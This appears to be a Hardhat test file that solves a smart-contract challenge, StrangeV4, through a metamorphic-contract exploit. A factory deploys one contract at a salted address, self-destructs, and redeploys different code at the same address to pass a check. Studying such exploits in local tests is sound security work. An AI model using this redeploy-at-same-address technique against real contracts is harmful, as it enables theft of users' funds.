const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");

describe("Constructor exploit", function () {
  async function deployContracts() {
    const StrangeV4 = await ethers.getContractFactory("StrangeV4");
    const strangeV4 = await StrangeV4.deploy({
      value: ethers.constants.WeiPerEther,
    });
    await strangeV4.deployed();

    const SuperSneakyFactory = await ethers.getContractFactory(
      "SuperSneakyFactory"
    );
    const superSneakyFactory = await SuperSneakyFactory.deploy();
    await superSneakyFactory.deployed();

    return { strangeV4, superSneakyFactory };
  }

  describe("strangeV4 works", function () {
    it("success function suceeds", async function () {
      const { strangeV4, superSneakyFactory } = await loadFixture(
        deployContracts
      );

      const salt = superSneakyFactory.address + "000000000000000000000000";

      await superSneakyFactory.deploySuperSneakyV1(salt);
      await strangeV4.initialize(await superSneakyFactory.superSneaky());
      await superSneakyFactory.destroy();
      await superSneakyFactory.deploySuperSneakyV2(salt);
      expect(await strangeV4.success(await superSneakyFactory.superSneaky())).to
        .be.ok;
    });
  });
});
